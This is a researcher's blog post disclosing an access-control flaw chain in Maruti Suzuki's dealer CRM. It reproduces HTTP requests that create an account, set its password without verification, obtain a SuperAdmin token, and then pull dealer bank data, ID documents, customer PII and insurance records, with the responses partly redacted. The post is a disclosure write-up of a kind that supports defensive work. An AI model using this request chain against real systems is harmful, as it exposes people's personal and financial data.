---
layout: default
title: "How I Nearly Accessed Millions of Maruti Suzuki Customer Records"
date: 2025-06-13
---

# How I Nearly Accessed Millions Of Maruti Suzuki Customer Records

Opinions expressed are solely my own and do not express the views or opinions of my employer

### TL;DR


Earlier this year, in the month of February, @rootsploit and I teamed up to look for bugs in Maruti Suzuki’s systems — and we ended up discovering security vulnerabilities that exposed both dealer and customer data. In this post, I walk through our motivation, reconnaissance approach, key findings, and the broader implications of what we uncovered — and why it matters.

<br>

### Introduction
After starting a new role as a Proactive Security Engineer last year , I spent most of my time on the left side of security learning everything I could about my new responsibilities. Between the new challenges, my bug bounty hunting quietly slipped into the background. But earlier this year, I decided it was time to get back in the game and start hunting for new Bug bounty targets.


While catching up on the latest in the bug bounty community, I stumbled upon Sam Curry’s [blog](https://samcurry.net/hacking-subaru) about hacking Subaru. The impact of his findings immediately grabbed my attention and it got me thinking: if these kinds of security issues are lurking in major global car brands, what about the automotive giants in India?


Fueled by curiosity, I messaged @rootsploit—a fellow hacker to see if he’d be up for teaming up on a new target. We bounced around a few ideas, but one stood out right away: Maruti Suzuki. It’s not just the biggest car company in India, but one of the largest in Asia. With so many customers and such a massive online presence, I figured there had to be something interesting hiding in plain sight.

<br>

### Recon
We started with the basics—mapping out all the digital assets tied to Maruti Suzuki. This meant poking around their main website, checking out customer-facing services, and looking for any backend systems that might be less obvious but more interesting from a security perspective.

One thing we noticed, thanks to Sam Curry’s blog, was that dealer dashboards and admin panels are often overlooked when it comes to security. These are usually managed by third-party vendors or built on top of existing CRM solutions, making them a potential weak spot.
While exploring, we found a feature on Maruti Suzuki’s site that helps users find nearby dealers. Testing this out got us thinking about how dealers onboard and manage customers—usually through some kind of central portal. If that portal isn’t locked down, it could be a single point of failure for a ton of sensitive data.

That’s when we started Google dorking for dealer-related endpoints and came across a subdomain that stood out: dealercrm.co.in. At first glance, it didn’t scream “Maruti Suzuki,” but a quick WHOIS lookup confirmed it was legit. The site itself was pretty barebones—just a login page and a “forgot password” link.

```
rtvkiz :~ / $ whois dealercrm.co.in

Domain Name: dealercrm.co.in
Registrar URL: www.godaddy.com
Updated Date: 2022-08-05T12:09:16Z
Creation Date: 2022-07-06T09:38:15Z
Registry Expiry Date: 2027-07-06T09:38:15Z
Registrar: GoDaddy.com, LLC
Registrar IANA ID: 146
Registrant Organization: Maruti Suzuki India Limited
Registrant State/Province: Haryana
```



It was a simple, straightforward page which only had the login fields and `forgot your password` option.


![alt text](https://raw.githubusercontent.com/rtvkiz/rtvkiz.github.io/refs/heads/main/_posts/dealercrm.png)

<br>

### Dig Deeper

At first, nothing seemed off with the login or password reset flows. But I started poking around in the JavaScript files and monitoring network traffic, hoping to find something interesting under the hood. It was a fun journey to follow through the code and put different pieces together.
Hidden in one of the main.js JavaScript files, I found references to 6 different subdomains. These weren’t obvious from just browsing the site, but they looked like they could be tied to internal dealer operations or other backend systems. Each one felt like a new rabbit hole to explore, and it was clear we were just scratching the surface.


![alt text](https://raw.githubusercontent.com/rtvkiz/rtvkiz.github.io/refs/heads/main/_posts/subdomain.png)


1. user.dealercrm.co.in
2. smr.dealercrm.co.in
3. mobapilead.smr.dealercrm.co.in
4. report.dealercrm.co.in
5. commonapi.dealercrm.co.in
6. leadapi.psfprod.dealercrm.co.in


I browsed all of these endpoints but the `/` or `/api` paths as seen in the screenshot resulted in an error or gave no response. Now the next sensible step was to do directory brute forcing. Running dirsearch on all these endpoints with the default wordlist gave very interesting output. `smr.dealercrm.co.in` and `user.dealercrm.co.in` had publicly accessible `SwaggerUI endpoints`


![alt text](https://raw.githubusercontent.com/rtvkiz/rtvkiz.github.io/refs/heads/main/_posts/user.png)


![alt text](https://raw.githubusercontent.com/rtvkiz/rtvkiz.github.io/refs/heads/main/_posts/smr.png)



I then reached out to @rootsploit to work on this together, and we started going through the APIs. There were a whole lot of APIs out there and based on the endpoints it looked like they could give us access to some critical customer/dealer information.


We encountered a roadblock, as most of the relevant APIs required a valid bearer token (JWT) for access (as expected). We then actively started skimming through the available APIs for authentication-related endpoints and came across a login endpoint.


```
POST /api/user/login HTTP/1.1
Host: user.dealercrm.co.in


{"username":"CRMXXXXX","password":"XXXXXX"}
```


The next challenge was authentication — the API required a valid username and password. Naturally, our focus shifted to finding a signup or account creation endpoint. This part involved a bit of trial and error, as the terminology used wasn’t straightforward. For car dealers, "signing up" can be considered as `onboarding`. Eventually, we came across an endpoint that included keywords like dealer, onboarding, and master, which seemed promising.


````
PUT /api/dealeronboarding/dealeronboardingusermastersubmission HTTP/1.1
Host: user.dealercrm.co.in
 
{"firstName":"a","lastName":"a","designationId":1,"experienceId":1,"dateOfBirth":"09/09/1998","dateOfJoining":"01/01/2023","primaryContactNo":"9999999999","secondaryContactNo":"9999999999",emailId":"example@gmail.com","qualificationId":5,"aadharNo":"667666676666","pan":"XXXXXXX","dealerId":100000}
 ````
 On sending this request through curl, we got a 200 OK response with `username` and `userId`. Nice!


 ```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Length: 73
 
{"errorStatus":false,"message":"Ok","userName":"CRM66666","userId":99999}
```
We got our username in the system but we still haven't set the password yet. I tried resetting the password using the username through the dealercrm portal, thinking that initiating that forgotten password flow might send a code to the email from the dealer onboarding call, but that didn't work.
Going back to the endpoints we figured out a password reset API which accepted username and password as the input - 
 
```
PUT /api/usermanagement/getsubmitnewpasswor HTTP/1.1
Host: user.dealercrm.co.in
 
{"username":"CRM66666","password":"test"}
```
Response:


```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"message":"Ok","userId":99999}
```
Based on the response we now have the username and the updated password in the system. By now you might have guessed what we did next:


```
POST /api/user/login HTTP/1.1
Host: user.dealercrm.co.in
 
{"username":"CRM66666","password":"test"}
```


Response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<TOKEN>","expiration":"2025-03-03T00:45:44Z","loginStatus":"","mspinExpired":"","lastLogindate":"","lastPasswordChangeDate":"","changePasswordStatus":"Mar 19 2025 9:51AM","otherLogin":"SMR","checkMspinFlag":1}
```
Success! We finally received a valid JWT token in the response—and what we found inside was far more interesting than expected.

Upon decoding the token, one claim immediately stood out: a role assignment with the value "SuperAdmin". This wasn't just any user — it was likely that our user was created with elevated privileges and potentially unrestricted access across the system.

```
{
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "SuperAdmin",
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/anonymous": "100000",
  "exp": 1740042829,
  "iss": "https://user.dealercrm.co.in/",
  "aud": "https://user.dealercrm.co.in/"
}
```

Now it was only a matter of sending requests with valid request parameters. To be fair, it was a little overwhelming going through all the APIs and identifying impactful endpoints that made sense and with minimal request parameters. I also remember sharing the API json list to ChatGPT to help us shortlisting based on the above criteria. 

After filtering and testing, we were able to successfully interact with over 15 different endpoints — many of which returned highly sensitive customer and dealer information. Below, I’ve highlighted the most impactful requests we uncovered during the assessment.

### Dealer Data
The API call on `/api/dealeronboarding/getdealerregionlistpending` was the first API we tested after getting the JWT token. It only needed a simple integer value - `userId`

```
POST /api/dealeronboarding/getdealerregionlistpending HTTP/1.1 
Host: user.dealercrm.co.in 
Authorization: Bearer <token> 

{"userId":1234,"processType":true}
```

Response:
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
 
[{
  "dealerID": 1306,
  "dealerName": "CHOW***.LTD.",
  "dealerZone": "West",
  "dealerParent": "CH***",
  "state": "MAHARASHTRA",
  "city": "SANGLI",
  "pinCode": "416416",
  "dealerRegion": "W2",
  "photoIdURL": "68b1b5b4-a3824c29-89da-1f15767c93ca.jpg",
  "penCard": "b717266c-8d76-4096-8489-10d84b25ef81.jpg",
  "dealerNameAsPerBankAcc": "CHOW**** <REDACTED>",
  "bankAccNo": "**REDACTED**",
  "ifscCode": "**REDACTED**",
  "gstNo": "27AACCC92*****",
  "onBoardingStatus": "Approve",
  "remark": "yes",
  "dealerChannel": "Nexa",
  "dealerCEOName": "<REDACTED>[J10201Admin00001]",
  "dealerAdminEmail": "*******@chow****d.com",
  "userRemarks": "Request your kind approval for centralized tracking (Submitted By: S***** [J10201Admin00001])",
  "rsmRemark": "Approved",
  "requestDate": "15-Jun-2023 06:28 PM",
  "requestID": 1306,
  "dealercode": "J1NA-01",
  "dealerSubscriptionPlan": "Basic Plus",
  "locationList": [
    {
      "locationCode": "MAHAVIRNAGAR,-2S(NEXA)",
      "workShopName": "MAHAVIRNAGAR,-2S(NEXA)",
      "dealercode": "J1NA-01",
      "city": "SANGLI",
      "state": "MAHARASHTRA",
      "dealerSubscriptionPlan": "Basic Plus"
    }
  ]
}]
...
<TRUNCATED>
```
We redacted a lot of information here, but to summarize we received the following:
1. All the dealers linked to that particular `userId`
2. Dealers PII:
    1. Bank Account information
        - Account Number
        - IFSC Code
    2. Dealer contact information
    3. PAN Card URL key
    4. Aadhar Card URL key (explained later)
3. Internal metadata: Dealer parent values, dealer ID, dealer code which will be chained with other API calls

Aadhar and PAN card are Indian Government issued Ids that are not to be shared with anyone. In the previous request we got URL keys which looked like identifiers for these files on the server. Now it wasnt hard to get the API which downloads the file based on url key. And so we passed these values in the request to `smr.dealercrm.co.in/api/awssthreebucket/downloadfileOnly` 
and the files were downloaded onto my system.

```
POST /api/awssthreebucket/downloadfileOnly HTTP/1.1 
Host: smr.dealercrm.co.in 
Authorization: Bearer <TOKEN> 
 
{"urlKey":"5cba087f-cf37-4227-a9ba-9c78af896c6d.pdf"} 
```

Response:
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Connection: keep-alive 
%PDF-1.7 
4 0 obj 
<< 
/BitsPerComponent 8 
/ColorSpace /DeviceRGB 
/Filter /DCTDecode 
/Height 81 
/Length 4350 
/Subtype /Image 
/Type /XObject 
/Width 806 
>> 
stream 
ÿØÿà 
….. 
<TRUNCATED>
```
It was straightforward to chain the previous `dealerregionlistpending` endpoint with the `downloadfileOnly` API. By extracting the URL keys from the earlier response and passing them directly into the file download endpoint, we could systematically retrieve and store Aadhar and PAN card documents for every dealer onboarded in Maruti Suzuki’s systems. This was serious - leaking Aadhar and PAN information is a major privacy violation under Indian law and can trigger government investigation or regulatory action.

<br>

### Customer Data
Probably the one you were waiting for. Upon testing we realised that there were multiple ways to get same data and the only difference was the input parameter - mobile number, registration number or an internal id call svocId. To get customer data we hit the endpoint `/api/customerdetail/fetchcustomerdetailsnew `. 

```
POST /api/customerdetail/fetchcustomerdetailsnew HTTP/1.1 
Host: smr.dealercrm.co.in 
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<TOKEN>
 
{"regNum":"MH12THXXXX","is Customer":1} 

```
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Length: 5295 

{
  "isCustomer": 0,
  "error": false,
  "data": [
    {
      "customer": {
        "svocId": 114153XXX,
        "title": "MRS",
        "customerName": "REN**** JITE******",
        "emailId": "*****15@hotmail.com",
        "mobileNo": "98501*****",
        "recentMobileNo": "985011****",
        "customerMobileDetails": {
          "mobileSale": "98501****",
          "mobileSrv": "98501*****",
          "mobileIns": "98501*****",
          "mobileLoyl": "98501*****",
          "mobileTv": "98501*****",
          "mobileCc": "98501*****",
          "mobileMds": "",
          "mobileEnq": "985011****"
        },
        "dateOfBirth": "19**-05-**",
        "age": "47",
        "dateOfAnniversary": "20**-06-06",
        "gender": "Female",
        "maritalStatus": "Married",
        "occupation": "Service/Salaried",
        "companyName": "NOT AVAILABLE",
        "panNo": "######024A",
        "loyaltyPointsBalance": 601,
        "tier": "Silver",
        "mood": "Bad",
        "residentialAddressSale": {
          "addressLine1": "B-56, ********",
          "addressLine2": "**********, **** ROAD,",
          "addressLine3": "BEH****** HOTEL, ****UD",
          "cityDesc": "PUNE",
          "stateDesc": "MAHARASHTRA",
          "districtName": "Pune",
          "pinCode": 411038
        },
        "gstNo": "###########ERED",
        "complaintCount": 9,
        "complaintOpenCount": 9,
        "upsellCrossSellOpportunity": "Will Buy EW - 5 Years, Will Spend High Amount on MSGA, Will Buy Zero Dep MI with Add Ons",
        "assetDetails": [
          {
            "assetNum": "MH12THXXXX",
            "assetType": "VEHICLE",
            "status": "ACTIVE"
          },
          {
            "assetNum": "41382XXXX",
            "assetType": "INSURANCE",
            "status": "ACTIVE"
          },
          {
            "assetNum": "L2103R0006XXXXX",
            "assetType": "LOYALTY_CARD",
            "status": "ACTIVE"
          }
        ],
        "vehicleDetails": [
          {
            "vinRegistrationNumber": "MH12THXXXX",
            "vinNumber": "MA3ENGL1S0025XXXX",
            "vinModelDescription": "S-CROSS",
            "vinVariantDescription": "MARUTI S-CROSS SMART HYBRID ZETA 1.5L AT",
            "fuelType": "PET",
            "vinColorDescription": "PEARL ARCTIC WHITE",
            "vinEwContractNumber": "2110874XXX",
            "ewType": "III",
            "ewExpiryDate": "2026-03-22",
            "ewExpiryMileage": "100000",
            "preferredDealerCode": "1908-19-02",
            "preferredDealerName": "XXXX",
            "vehicleExpenditure": {
              "totalAccessoriesSpend": 1497.13,
              "totalFreeServiceSpend": 6330.56,
              "totalPmsServiceSpend": 27035.45,
              "totalAccidentalServiceSpend": 9558.0,
              "totalOtherServiceSpend": 1835.96
            },
            "ownershipStartAt": "2021-03-23",
            "ownershipEndAt": "2099-12-31",
            "pullFactor": [
              {
                "name": "Extended Warranty",
                "tier": "III",
                "number": "211087****",
                "expiryDate": "22-Mar-2026",
                "balance": "0.00"
              },
              {
                "name": "Loyalty Card",
                "tier": "Silver",
                "number": "L2103R00063****",
                "balance": "601"
              }]
          }]
      }}
  ]}
```

Observe the fields containing sensitive customer PII.. Some of the information we were able to access was contact details, address information, vehicle asset details etc.  This information was very handy while chaining different API calls.

<br>

### Customer Vehicle Insurance detials
Another API that I would like to highlight is `/api/insurance details/getpolicydetailsmarutinew`. Not hard to interpret, this call allowed us to retrieve vehicle insurance details of Maruti Suzuki Customers and needed two parameters:

- policyNo
- vinNo

It was easy to retrieve vehicle `vinNo` from many different API calls like previously described `customerdetails` API but there was no information of the policyNo. We did little recon on insurance website for Maruti Suzuki which led us to  `https://www.marutisuzukiinsurance.com`. We only needed the policy number and luckily the webiste provided that value with just the registered mobile number of the registered user. 

![alt text](https://raw.githubusercontent.com/rtvkiz/rtvkiz.github.io/refs/heads/main/_posts/policy-page.png)

There were often multiple ways to retrieve the same values across different APIs. For instance, a `vinNo` could be obtained either from the vehicle details API or the customer info API. Leveraging this, we crafted a request to the `getpolicydetailsmarutinew` endpoint.

```
POST /api/insurancedetails/getpolicydetailsmarutinew HTTP/1.1 
Host: smr.dealercrm.co.in 
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 <TOKEN>

 
{"policyNo":"98000031240115******","vinNo":"MA3EYD81S01*****"}
```

Response:

```
{
  "error": false,
  "errors": null,
  "data": {
    "antitheftDeviceAvl": "Y",
    "allMobileAndPhoneNumber": "805879****",
    "applicableBonus": "35",
    "autoMembership": "N",
    "bangladeshCov": "N",
    "bhutanCov": "N",
    "bifuelIdv": "0",
    "bifuelKit": "N",
    "cancellationStatus": null,
    "chassisNo": "1012985",
    "chequeAmo": "3382",
    "chequeDate": null,
    "chequeNum": "54709***",
    "claimCount": 0,
    "cityOfReg": "JAIPUR",
    "clientType": "INDIVIDUAL",
    "cngKitName": 0,
    "cngLpgKitValue": "N",
    "collectionDate": null,
    "compulsoryPa": "N",
    "consumable": "N",
    "colorDescription": "MET.CARIBBEAN BLUE",
    "creditAmo": "3382",
    "creditDate": "16-Dec-2024",
    "cubicCapacity": 796,
    "customerState": "C-***, TARA NAGAR,**** ***TAK, JHOTWARA -931530**** ,931530**** C-***, TARA NAG***,NEAR K***I PHATAK, JHOTWARA -931530****,931530****",
    "customerType": "INDIVIDUAL",
    "dateOfExpiry": "14-Dec-2025",
    "dealerAddress": "***** ******* Near Ajmer Pulia, Gopal Bari, ******* Road, Jaipur",
    "dealerCity": "JAIPUR",
    "dealerOutletCode": "2009",
    "depositNo": "35",
    "driverCoverage": "Y",
    "drivingInsVehicle": "N",
    "dseTelleCallerMobileNo": "805879XXXX",
    "dseTelleCallerName": "TC P****A",
    "electricalAccPremium": 0,
    "electricalAssessories": "0.0",
    "emailId": "vi****@autovyn.in",
    "empRliabilityNoOfEmp": 0,
    "endorsementStatus": null,
    "engineCover": "N",
    "engineNo": "1192823",
    "exCng": "N",
    "extAccIncluded": "N",
    "exshowroomPrice": 270000,
    "financierBranch": "-",
    "financierName": "-",
    "fuelType": "Petrol",
    "geoAreaExtn": "N",
    "gstinCustomer": null,
    "grossPremiumPaid": 3382,
    "insuranceCompanyName": "New India",
    "inCng": "N",
    "instrumentBank": "-",
    "insuredDealer": null,
    "insuredName": "Mr.VIKA****",
    "keyProtect": "N",
    "legalLiabilityDriver": "Y",
    "loyaltyPoints": null,
    "legalLiabilityEmp": 0,
    "maldivesCov": "N",
    "ncb": "N",
    "ncbPercentage": "35",
    "nepalCov": "N",
    "nominee age": null,
    "nomineename": "MRS. HAR****A YA**V",
    "nomineerelation": null,
    "nonElectricalAccValue": 0,
    "odDateOfExpiry": null,
    "outletName": "Prem ***** Pvt Ltd",
    "paSumInsuredPerPerson": 0,
    "pakistanCov": "N",
    "panNoOfPerson": "5",
    "partAPremium": 447,
    "partBPremium": 2419,
    "paymentMode": "AUTO DEBIT",
    "policyIssueDate": "14-Dec-2024",
    "policyNo": "98000031240115*****",
    "policyRiskInceptionDate": "15-Dec-2024",
    "policyType": "Comprehensive",
    "proposalNo": "R20027****",
    "renewalMode": "DEALER",
    "riskExpiryDate": "14-Dec-2025",
    "rsa": "N",
    "rti": "N",
    "rtoLocation": "RTO",
    "saCpa": "N",
    "sacpaPolicyno": "-",
    "sacpaRiskExpiryDate": "-",
    "sacpaRiskInceptionDate": "-",
    "seatingCapacity": 5,
    "srilankaCov": "N",
    "subpolicyType": "-",
    "subscription": "N",
    "sumPerPerson": 0,
    "thirdPartyPdExtnSumAssured": 750000,
    "vehicleIdv": "25",
    "vehicleHypothecationStatus": "--",
    "vehicleRegnNo": "RJ-14-CE-****",
    "vehicleSaleDate": "15-Nov-20**",
    "vehicleType": "P",
    "vehicleSubModel": "Alto Lx",
    "voluntaryExcessLimit": 0,
    "yearOfManufacture": 20**,
    "zeroDep": "N"
  }
}
```

The response from this API immediately caught our attention. It exposed a wealth of sensitive data, including nominee details, insurance policy information, and full contact records—raising serious concerns about the level of access available without proper authorization. 

<br>

### Impact

The potential impact of this breach was massive. With access to data belonging to nearly 25 million customers, a threat actor could have done serious damage. While we focused on a subset of the exposed APIs, many others were still reachable and likely vulnerable. What makes this even more critical is how easily these API call chains could be automated to perform large-scale data exfiltration. In India, Aadhar and PAN card details are tightly linked to a wide range of essential services—from banking to government schemes—which increases the risk of downstream exploitation. The leaked data, which includes service history and vehicle damage records, offers threat actors a precise timeline and context to execute highly convincing phishing attacks.
Even low-skilled attackers could script the API calls to build detailed user profiles, potentially weaponizing that information for identity theft, financial fraud, or large-scale social engineering campaigns.

<br>

### Findings Summarized


| #  | Vulnerability Title                          | Description |
|----|----------------------------------------------|-------------|
| 1  | Dealer & Employee Data Exposure              | Unrestricted access to all dealer and employee information, including Aadhar Card, PAN Card, bank details, contact information, and the ability to download files. |
| 2  | Unauthorized Dealer Onboarding & Data Modification | Ability to onboard as a dealer and update existing dealer data|
| 3  | Customer Data Retrieval                      | Access to Maruti Suzuki customer details using mobile numbers, car registration numbers, or svocId. |
| 4  | Vehicle Service History Exposure             | Access to customers’ full service history, including dealer details, service costs, and labor charges. |
| 5  | Insurance Information Exposure               | Access to customer insurance details, including nominee information, policy amount, and customer cheque data. |
| 6  | Password Reset for Any Dealer/Employee       | Ability to reset the password for any active dealer user/employee on user.dealercrm.co.in subdomain |
| 7  | SmartEye Data Leak                           | Exposure of vehicle damage information. |
| 8  | Dealer Workshop Activity Exposure            | Access to in-out car information for dealer workshops across any time period. |

<br>

### Reporting and Disclosure

Surprisingly, discovering these issues turned out to be the easy part—reporting them responsibly was far more challenging. 

We initially reached out to the official contact email listed on Maruti Suzuki's website, sending multiple messages without receiving a single response. In an effort to escalate responsibly, we attempted to connect with employees on LinkedIn, but again, no meaningful replies came through. Luckily one of the managers at Maruti Suzuki replied back and sent us an email from the corporate address where we shared the report. Despite repeated follow-ups, we received no further response or updates. Out of caution and fairness, we chose to wait and give Maruti Suzuki a 90-day buffer period to address the issues. During that time, we noticed the vulnerable hosts were eventually taken offline.

I would like to thank @rootsploit for working me on this hunt and Sam Curry (@samwcyo) for inspiring me to look into car manufacturers and dealers, and sharing the insights on their blog.


Thank you for reading!

---
### Timeline

| Date             | Event                                                       |
|------------------|-------------------------------------------------------------|
| Feb 23, 2025     | Initial attempt to contact Maruti Suzuki via email          |
| Feb 27, 2025     | Follow-up email sent                                        |
| Mar 2, 2025     | Report sent to Maruti Suzuki security manager               |
| Mar 13, 2025     | Attempt to reach out to Maruti Suzuki - no response            |
|May 18, 2025 | Vulnerability fixed - unable to reproduce | 
| June 13, 2025    |   Blog published after 90-day disclosure period  

----------
